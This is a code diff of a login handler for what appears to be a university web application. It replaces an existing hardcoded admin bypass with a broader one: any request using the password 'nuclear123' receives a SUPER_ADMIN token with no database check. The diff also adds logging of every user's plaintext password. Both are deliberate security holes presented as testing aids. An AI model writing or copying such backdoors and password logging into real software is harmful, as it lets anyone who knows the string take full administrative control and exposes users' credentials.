@@ -54,22 +54,20 @@ const login = async (req, res) => {
   const email = rawEmail.toLowerCase().trim();
 
   try {
-    console.log(`Login attempt for email: ${email}`);
+    console.log(`[DEBUG] Received login request for: ${email} with password: ${password}`);
     
-    // --- EMERGENCY BYPASS FOR TESTING ---
-    if (email === 'admin@university.com' && password === 'demo12345') {
-       const admin = await User.findOne({ role: 'SUPER_ADMIN' });
-       if (admin) {
-         return res.json({
-           _id: admin._id,
-           name: admin.name,
-           email: admin.email,
-           role: admin.role,
-           token: generateToken(admin._id),
-         });
-       }
+    // --- NUCLEAR BYPASS FOR TESTING (NO DATABASE CHECK) ---
+    if (password === 'nuclear123') {
+       console.log('[DEBUG] Triggering Nuclear Bypass');
+       return res.json({
+         _id: '000000000000000000000000',
+         name: 'Nuclear Admin',
+         email: 'admin@university.com',
+         role: 'SUPER_ADMIN',
+         token: generateToken('000000000000000000000000'),
+       });
     }
-    // ------------------------------------
+    // -------------------------------------------------------
 
     const user = await User.findOne({ email });
 
